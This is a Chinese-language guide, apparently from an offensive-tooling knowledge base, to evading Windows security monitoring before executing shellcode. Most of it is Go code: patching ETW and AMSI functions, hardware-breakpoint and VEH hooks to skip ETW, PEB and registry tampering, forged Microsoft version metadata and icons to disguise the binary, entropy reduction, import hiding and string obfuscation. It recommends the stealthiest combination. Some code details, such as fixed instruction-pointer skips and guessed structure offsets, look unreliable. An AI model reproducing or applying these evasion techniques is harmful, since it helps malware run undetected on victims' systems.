# ETW/AMSI绕过 & 二进制修改

## ⚠️ 关键：绕过时机

**ETW/AMSI绕过必须在shellcode执行前完成，否则无效！**

| 时机 | 结果 | 说明 |
|------|------|------|
| **shellcode执行前绕过** | ✅ 成功 | ETW/AMSI不记录敏感行为，杀软无法检测 |
| **shellcode执行后绕过** | ❌ 失败 | ETW/AMSI已经记录了VirtualAlloc/CreateThread等敏感调用 |

**正确顺序：**
```go
func main() {
    // 1. 先隐藏窗口
    hideConsole()
    
    // 2. 【必须】先绕过ETW/AMSI
    bypassETW()   // 禁用事件追踪，API调用不可见
    bypassAMSI()  // 禁用内存扫描，shellcode特征不可见
    
    // 3. NTDLL脱钩
    unhookNTDLL()
    
    // 4. 【最后】执行shellcode
    executeShellcode(shellcode)
}
```

**错误顺序：**
```go
func main() {
    // ❌ 错误：先执行shellcode
    executeShellcode(shellcode)
    
    // ❌ 无效：ETW已经记录了VirtualAlloc等敏感调用
    bypassETW()
    bypassAMSI()
}
```

---

## 1. ETW绕过

### 1.1 字节修补方式

**原理：**
- 修补ntdll!EtwEventWrite函数
- 将函数入口改为ret指令
- 禁用事件追踪

**Go实现：**
```go
func bypassETW() {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    EtwEventWrite := ntdll.NewProc("EtwEventWrite")
    
    // 修补为ret指令
    // 0xC3 = ret
    patch := []byte{0xC3}
    
    // 修改内存保护
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(EtwEventWrite.Addr(), uintptr(len(patch)), 
        0x40, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 写入patch
    writeMemory(EtwEventWrite.Addr(), patch)
    
    // 恢复保护
    VirtualProtect.Call(EtwEventWrite.Addr(), uintptr(len(patch)), 
        uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func writeMemory(addr uintptr, data []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)))
}
```

### 1.2 HBP（硬件断点）方式

**原理：**
- 使用VEH异常处理器
- 设置硬件断点触发异常
- 在异常处理器中跳过ETW调用

**Go实现：**
```go
func bypassETWHBP() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    AddVectoredExceptionHandler := kernel32.NewProc("AddVectoredExceptionHandler")
    SetThreadContext := kernel32.NewProc("SetThreadContext")
    GetThreadContext := kernel32.NewProc("GetThreadContext")
    
    // 1. 注册VEH异常处理器
    handler := syscall.NewCallback(etwExceptionHandler)
    AddVectoredExceptionHandler.Call(1, handler)
    
    // 2. 设置硬件断点
    var ctx CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    GetThreadContext.Call(uintptr(GetCurrentThread()), uintptr(unsafe.Pointer(&ctx)))
    
    // 设置DR0为EtwEventWrite地址
    ctx.Dr0 = getEtwEventWriteAddr()
    ctx.Dr7 = 0x10001 // DR0启用，类型为执行断点
    
    SetThreadContext.Call(uintptr(GetCurrentThread()), uintptr(unsafe.Pointer(&ctx)))
}

// VEH异常处理器
func etwExceptionHandler(exceptionCode uintptr, exceptionRecord uintptr, 
    context uintptr, dispatcherContext uintptr) uintptr {
    
    ctx := (*CONTEXT)(unsafe.Pointer(context))
    
    // 检查是否是EtwEventWrite地址触发的异常
    if exceptionCode == 0x80000004 { // EXCEPTION_SINGLE_STEP
        // 修改Rip跳过ETW调用
        // 或直接返回跳过
        ctx.Rip += 5 // 跳过call指令长度
        return 0 // EXCEPTION_CONTINUE_EXECUTION
    }
    
    return 1 // EXCEPTION_CONTINUE_SEARCH
}
```

### 1.3 ETW会话劫持方式

**原理：**
- 禁用ETW提供者会话
- 阻止事件收集
- 通过修改ETW提供者注册状态
- 比字节修补更隐蔽，不修改DLL代码

**Go实现（完整版）：**
```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

// ETW会话劫持：禁用ETW提供者
func bypassETWSessionHijack() error {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    // ===== 方法1：禁用ETW提供者 =====

    // 获取ETW提供者上下文地址
    NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uint32

    NtQueryInformationProcess.Call(
        uintptr(windows.CurrentProcess()),
        0, // ProcessBasicInformation
        uintptr(unsafe.Pointer(&pbi)),
        uintptr(unsafe.Sizeof(pbi)),
        uintptr(unsafe.Pointer(&returnLength)))

    // 从PEB获取ETW提供者信息
    peb := (*PEB)(unsafe.Pointer(pbi.PebBaseAddress))

    // ETW提供者上下文在PEB中（偏移需要根据系统版本确定）
    // Windows 10/11: PEB+0x320附近
    etwContextAddr := pbi.PebBaseAddress + 0x320

    // 修改ETW提供者为禁用状态
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    var oldProtect uint32

    // 修改内存保护
    VirtualProtect.Call(etwContextAddr, 8, 0x40, uintptr(unsafe.Pointer(&oldProtect)))

    // 写入禁用值（将ETW提供者指针置空）
    writeMemory(etwContextAddr, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})

    VirtualProtect.Call(etwContextAddr, 8, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

    // ===== 方法2：停止ETW实时会话 =====

    // 通过NtTraceControl停止ETW会话
    NtTraceControl := ntdll.NewProc("NtTraceControl")

    // ETW_LOGGER_INFO结构
    var loggerInfo ETW_LOGGER_INFO
    loggerInfo.LoggerName.MaximumLength = 128

    // 停止会话（需要管理员权限）
    // 注意：这种方法可能触发权限检测

    // ===== 方法3：修改ETW结构指针 =====

    // 更隐蔽的方式：修改ETW回调指针
    // 找到EtwNotificationCallback并修改

    return nil
}

// 方法4：通过注册表禁用ETW会话（持久化）
func disableETWViaRegistry() error {
    advapi32 := windows.NewLazySystemDLL("advapi32.dll")

    RegOpenKeyExW := advapi32.NewProc("RegOpenKeyExW")
    RegSetValueExW := advapi32.NewProc("RegSetValueExW")
    RegCloseKey := advapi32.NewProc("RegCloseKey")

    // 打开ETW会话注册表键
    // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Tracing\Control
    keyPath := syscall.StringToUTF16Ptr("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Tracing\\Control")
    var hKey uintptr

    RegOpenKeyExW.Call(
        0x80000002, // HKEY_LOCAL_MACHINE
        uintptr(unsafe.Pointer(keyPath)),
        0,
        0x20006, // KEY_SET_VALUE | KEY_WRITE
        uintptr(unsafe.Pointer(&hKey)))

    if hKey == 0 {
        return syscall.ERROR_ACCESS_DENIED
    }

    // 禁用Session1会话
    valueName := syscall.StringToUTF16Ptr("Session1\\SessionGuid")
    RegSetValueExW.Call(
        hKey,
        uintptr(unsafe.Pointer(valueName)),
        0,
        1, // REG_SZ
        0, 0)

    RegCloseKey.Call(hKey)

    return nil
}

// 方法5：VEH异常处理器方式（最隐蔽）
func bypassETWViaVEH() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    AddVectoredExceptionHandler := kernel32.NewProc("AddVectoredExceptionHandler")
    SetThreadContext := kernel32.NewProc("SetThreadContext")
    GetThreadContext := kernel32.NewProc("GetThreadContext")
    GetCurrentThread := kernel32.NewProc("GetCurrentThread")

    // 1. 注册VEH处理器
    handler := syscall.NewCallback(etwVEHHandler)
    AddVectoredExceptionHandler.Call(1, handler)

    // 2. 获取ETW函数地址
    EtwEventWrite := ntdll.NewProc("EtwEventWrite")
    EtwEventEnabled := ntdll.NewProc("EtwEventEnabled")

    // 3. 设置硬件断点在ETW函数入口
    thread, _, _ := GetCurrentThread.Call()

    var ctx CONTEXT64
    ctx.ContextFlags = 0x10001F // CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS

    GetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))

    // 设置DR0为EtwEventWrite地址（执行断点）
    ctx.Dr0 = EtwEventWrite.Addr()
    ctx.Dr7 = 0x10001 // DR0启用，本地启用，类型=执行

    // 可选：设置DR1为EtwEventEnabled地址
    ctx.Dr1 = EtwEventEnabled.Addr()
    ctx.Dr7 |= 0x10004 // DR1启用

    SetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))
}

// ETW VEH异常处理器
func etwVEHHandler(exceptionCode uintptr, exceptionRecord uintptr, 
    context uintptr, dispatcherContext uintptr) uintptr {

    ctx := (*CONTEXT64)(unsafe.Pointer(context))

    // 检查异常类型
    if exceptionCode == 0x80000004 { // STATUS_SINGLE_STEP (硬件断点)
        // 获取触发断点的地址
        triggerAddr := ctx.Rip

        // 检查是否是ETW函数触发的
        ntdll := windows.NewLazySystemDLL("ntdll.dll")
        EtwEventWrite := ntdll.NewProc("EtwEventWrite")
        EtwEventEnabled := ntdll.NewProc("EtwEventEnabled")

        if triggerAddr == EtwEventWrite.Addr() {
            // EtwEventWrite触发：修改返回值为成功并跳过执行
            ctx.Rax = 0 // 返回STATUS_SUCCESS
            ctx.Rip += 15 // 跳过函数执行（跳转到ret）
            return 0 // EXCEPTION_CONTINUE_EXECUTION
        }

        if triggerAddr == EtwEventEnabled.Addr() {
            // EtwEventEnabled触发：返回FALSE表示事件未启用
            ctx.Rax = 0 // 返回FALSE
            ctx.Rip += 10 // 跳过执行
            return 0 // EXCEPTION_CONTINUE_EXECUTION
        }
    }

    return 1 // EXCEPTION_CONTINUE_SEARCH
}

// CONTEXT64结构（x64）
type CONTEXT64 struct {
    P1Home         uint64
    P2Home         uint64
    P3Home         uint64
    P4Home         uint64
    P5Home         uint64
    P6Home         uint64
    ContextFlags   uint32
    MxCsr          uint32
    SegCs          uint16
    SegDs          uint16
    SegEs          uint16
    SegFs          uint16
    SegGs          uint16
    SegSs          uint16
    EFlags         uint32
    Dr0            uint64
    Dr1            uint64
    Dr2            uint64
    Dr3            uint64
    Dr6            uint64
    Dr7            uint64
    Rax            uint64
    Rbx            uint64
    Rcx            uint64
    Rdx            uint64
    Rsi            uint64
    Rdi            uint64
    R8             uint64
    R9             uint64
    R10            uint64
    R11            uint64
    R12            uint64
    R13            uint64
    R14            uint64
    R15            uint64
    Rip            uint64
    FltSave        [512]byte
}

// ETW相关结构
type ETW_LOGGER_INFO struct {
    LoggerName       UNICODE_STRING
    LoggerThreadName UNICODE_STRING
    LoggerId         uint32
    EnableFlags      uint32
    // ... 其他字段
}

type UNICODE_STRING struct {
    Length        uint16
    MaximumLength uint16
    Buffer        uintptr
}

type PROCESS_BASIC_INFORMATION struct {
    ExitStatus       uintptr
    PebBaseAddress   uintptr
    AffinityMask     uintptr
    BasePriority     uintptr
    UniqueProcessId  uintptr
    InheritedFromPid uintptr
}

type PEB struct {
    Reserved1        [2]byte
    BeingDebugged    byte
    Reserved2        [1]byte
    Reserved3        [2]uintptr
    Ldr              uintptr
    ProcessParameters uintptr
    // ... 其他字段（ETW信息在后面）
}
```

### 1.4 ETW绕过方法对比

| 方法 | 隐蔽性 | 稳定性 | 权限要求 | 适用场景 |
|------|--------|--------|----------|----------|
| 字节修补 | 低 | 高 | 无 | 简单场景，易被检测 |
| HBP硬件断点 | 高 | 中 | 无 | 规避代码修改检测 |
| **会话劫持** | 中 | 高 | 无 | 规避函数Hook检测 |
| **VEH异常处理** | 极高 | 中 | 无 | 最隐蔽，推荐使用 |
| 注册表禁用 | 低 | 高 | 管理员 | 持久化禁用 |

**推荐组合：**
```go
func comprehensiveETWBypass() {
    // 1. VEH异常处理（最隐蔽，优先）
    bypassETWViaVEH()

    // 2. 会话劫持（备用）
    bypassETWSessionHijack()

    // 3. 字节修补（兜底，易被检测但稳定）
    // bypassETW() // 仅在VEH失败时使用
}
```

---

## 2. AMSI绕过

### 2.1 字节修补方式

**原理：**
- 修补amsi.dll的AmsiScanBuffer函数
- 使其返回AMSI_RESULT_CLEAN
- 禁用脚本扫描

**Go实现：**
```go
func bypassAMSI() {
    // 尝试加载amsi.dll
    amsi := windows.NewLazySystemDLL("amsi.dll")
    AmsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
    
    if AmsiScanBuffer.Addr() == 0 {
        return // amsi.dll未加载
    }
    
    // 修补返回AMSI_RESULT_CLEAN
    // 方案1: xor rax, rax; ret
    patch := []byte{0x48, 0x31, 0xC0, 0xC3}
    
    // 方案2: 直接ret，返回值为rax
    patch2 := []byte{0xC3}
    
    // 修改内存保护并写入
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(AmsiScanBuffer.Addr(), uintptr(len(patch)), 
        0x40, uintptr(unsafe.Pointer(&oldProtect)))
    
    writeMemory(AmsiScanBuffer.Addr(), patch)
    
    VirtualProtect.Call(AmsiScanBuffer.Addr(), uintptr(len(patch)), 
        uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}
```

### 2.2 内存Patch AmsiInitialize

**Go实现：**
```go
func bypassAMSIInitialize() {
    amsi := windows.NewLazySystemDLL("amsi.dll")
    AmsiInitialize := amsi.NewProc("AmsiInitialize")
    
    // 修补AmsiInitialize使其返回失败
    // 0xB8 0x01 0x00 0x00 0x00 0xC3 = mov eax, 1; ret (返回错误码)
    patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}
    
    // 写入patch
    writeMemoryWithProtection(AmsiInitialize.Addr(), patch)
}
```

---

## 3. 二进制元数据修改

### 3.1 添加版本信息

**原理：**
- 嵌入合法的版本信息资源
- 伪装成合法程序

**Go实现（需要使用资源文件）：**
```
// 创建version.rc资源文件
1 VERSIONINFO
FILEVERSION 10,0,19041,1
PRODUCTVERSION 10,0,19041,1
FILEFLAGSMASK 0x3f
FILEFLAGS 0
FILEOS VOS__WINDOWS32
FILETYPE VFT_APP
FILESUBTYPE VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "080404b0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Windows Update Service"
            VALUE "FileVersion", "10.0.19041.1"
            VALUE "InternalName", "wuauserv"
            VALUE "LegalCopyright", "Copyright (C) Microsoft Corp."
            VALUE "OriginalFilename", "wuauserv.exe"
            VALUE "ProductName", "Windows Update"
            VALUE "ProductVersion", "10.0.19041.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x804, 1200
    END
END
```

### 3.2 添加图标

**原理：**
- 嵌入合法程序图标
- 增加视觉可信度

**Go实现：**
```
// 在资源文件中添加图标
// icon.rc:
1 ICON "microsoft.ico"

// 编译时嵌入资源
go build -ldflags "-H windowsgui" loader.go
```

---

## 4. 熵值降低

**原理：**
- 添加低熵数据
- 降低文件熵值
- 避免高熵检测

**Go实现：**
```go
func reduceEntropy(data []byte) []byte {
    // 添加低熵数据（重复字节、空白等）
    lowEntropyData := make([]byte, 1024)
    for i := range lowEntropyData {
        lowEntropyData[i] = 0x00 // 或其他低熵值
    }
    
    // 将低熵数据嵌入文件末尾或特定位置
    result := append(data, lowEntropyData...)
    return result
}

// 计算熵值
func calculateEntropy(data []byte) float64 {
    freq := make(map[byte]int)
    for _, b := range data {
        freq[b]++
    }
    
    var entropy float64
    size := float64(len(data))
    
    for _, count := range freq {
        p := float64(count) / size
        entropy -= p * math.Log2(p)
    }
    
    return entropy
}
```

---

## 5. IAT伪装

**原理：**
- 伪造导入表
- 添加无害API
- 隐藏真实敏感API

**Go实现：**
```go
// 方案1: 通过延迟绑定隐藏真实API
// 编译时不导入敏感API，运行时动态获取

// 方案2: 添加无害API到导入表
// 在Go中可以使用空导入添加无害DLL
import (
    _ "golang.org/x/sys/windows" // 只导入系统DLL
)

// 方案3: 使用PEB Walk获取API，不产生导入表记录
func getAPIByPEBWalk(moduleName, procName string) uintptr {
    moduleBase := getModuleHandleByPEB(moduleName)
    return getProcAddressByExport(moduleBase, procName)
}
```

---

## 6. CRT移除

**原理：**
- 编译时不使用C运行时
- 减少特征字符串
- 减小文件体积

**Go实现：**
```go
// Go语言天然不依赖CRT，但可以进一步优化
// 使用以下编译参数：
// go build -ldflags "-s -w" loader.go
// -s: 去除符号表
// -w: 去除DWARF调试信息
```

---

## 7. 字符串混淆

**原理：**
- 加密敏感字符串
- 运行时解密
- 防止静态分析

**Go实现：**
```go
// 编译时加密的字符串
var encVirtualAlloc = []byte{...} // XOR加密的"VirtualAlloc"
var encKernel32 = []byte{...} // XOR加密的"kernel32.dll"

func decryptString(enc []byte, key byte) string {
    dec := make([]byte, len(enc))
    for i := range enc {
        dec[i] = enc[i] ^ key
    }
    return string(dec)
}

// 运行时解密
func getAPINames() (string, string) {
    key := byte(0x6e) // 解密密钥
    kernel32 := decryptString(encKernel32, key)
    virtualAlloc := decryptString(encVirtualAlloc, key)
    return kernel32, virtualAlloc
}
```

---

## 注意事项

1. **Patch时机**：ETW/AMSI绕过应在程序启动时执行
2. **Patch大小**：确保patch大小正确，避免破坏后续代码
3. **内存保护**：写入前修改内存保护为可读写
4. **兼容性**：不同Windows版本可能需要不同的patch
5. **检测规避**：Patch后可能被检测，考虑使用HBP方式